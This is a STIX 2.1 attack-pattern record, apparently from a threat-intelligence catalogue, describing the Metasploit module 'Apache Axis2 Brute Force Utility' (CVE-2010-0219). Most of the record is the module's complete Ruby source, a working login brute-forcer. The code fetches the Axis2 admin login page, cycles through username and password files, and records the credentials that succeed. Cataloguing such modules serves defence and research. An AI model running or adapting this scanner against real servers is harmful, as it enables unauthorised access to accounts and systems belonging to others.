{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--db4fd0f0-40e4-4a76-b314-a77a6c35f968",
    "created": "2024-08-14T16:30:23.511386Z",
    "modified": "2024-08-14T16:30:23.511391Z",
    "name": "Apache Axis2 Brute Force Utility",
    "description": " This module attempts to login to an Apache Axis2 instance using username and password combinations indicated by the USER_FILE PASS_FILE, and USERPASS_FILE options. It has been verified to work on at least versions 1.4.1 and 1.6.2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/axis_login.rb",
            "external_id": "axis_login.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0219"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/login_scanner/axis2'\nrequire 'metasploit/framework/credential_collection'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n\n  def initialize\n    super(\n      'Name'           => 'Apache Axis2 Brute Force Utility',\n      'Description'    => %q{\n        This module attempts to login to an Apache Axis2 instance using\n        username and password combinations indicated by the USER_FILE,\n        PASS_FILE, and USERPASS_FILE options. It has been verified to\n        work on at least versions 1.4.1 and 1.6.2.\n      },\n      'Author'         =>\n        [\n          'Leandro Oliveira <leandrofernando[at]gmail.com>'\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2010-0219' ],\n          [ 'OSVDB', '68662'],\n        ],\n      'License'        => MSF_LICENSE\n    )\n\n    register_options( [\n      Opt::RPORT(8080),\n      OptString.new('TARGETURI', [false, 'Path to the Apache Axis Administration page', '/axis2/axis2-admin/login']),\n    ])\n\n    deregister_options('PASSWORD_SPRAY')\n  end\n\n  # For print_* methods\n  def target_url\n    \"http://#{vhost}:#{rport}#{datastore['URI']}\"\n  end\n\n  def run_host(ip)\n    uri = normalize_uri(target_uri.path)\n\n    print_status(\"Verifying login exists at #{target_url}\")\n    begin\n      send_request_cgi({\n        'method'  => 'GET',\n        'uri'     => uri\n      }, 20)\n    rescue => e\n      print_error(\"Failed to retrieve Axis2 login page at #{target_url}\")\n      print_error(\"Error: #{e.class}: #{e}\")\n      return\n    end\n\n    print_status \"#{target_url} - Apache Axis - Attempting authentication\"\n\n    cred_collection = build_credential_collection(\n      username: datastore['USERNAME'],\n      password: datastore['PASSWORD']\n    )\n\n    scanner = Metasploit::Framework::LoginScanner::Axis2.new(\n      configure_http_login_scanner(\n        uri: uri,\n        cred_details: cred_collection,\n        stop_on_success: datastore['STOP_ON_SUCCESS'],\n        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n        connection_timeout: 5,\n        http_username: datastore['HttpUsername'],\n        http_password: datastore['HttpPassword']\n      )\n    )\n\n    scanner.scan! do |result|\n      credential_data = result.to_h\n      credential_data.merge!(\n          module_fullname: self.fullname,\n          workspace_id: myworkspace_id\n      )\n      case result.status\n      when Metasploit::Model::Login::Status::SUCCESSFUL\n        print_brute :level => :good, :ip => ip, :msg => \"Success: '#{result.credential}'\"\n        credential_core = create_credential(credential_data)\n        credential_data[:core] = credential_core\n        create_credential_login(credential_data)\n        :next_user\n      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT\n        if datastore['VERBOSE']\n          print_brute :level => :verror, :ip => ip, :msg => \"Could not connect\"\n        end\n        invalidate_login(credential_data)\n        :abort\n      when Metasploit::Model::Login::Status::INCORRECT\n        if datastore['VERBOSE']\n          print_brute :level => :verror, :ip => ip, :msg => \"Failed: '#{result.credential}'\"\n        end\n        invalidate_login(credential_data)\n      end\n    end\n\n  end\n\n\n\nend\n"
}